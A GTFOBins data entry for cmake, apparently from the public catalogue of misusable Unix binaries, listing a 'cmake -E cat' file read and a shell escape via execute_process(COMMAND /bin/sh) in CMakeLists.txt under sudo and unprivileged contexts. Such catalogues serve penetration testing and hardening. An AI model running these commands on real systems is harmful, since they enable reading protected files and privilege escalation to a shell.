<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/cmake -->
---
functions:
  file-read:
  - code: |-
      cmake -E cat /path/to/input-file
    contexts:
      sudo:
      unprivileged:
  shell:
  - code: |-
      echo 'execute_process(COMMAND /bin/sh)' >/path/to/CMakeLists.txt
      cmake /path/to/
    contexts:
      sudo:
      unprivileged:
...
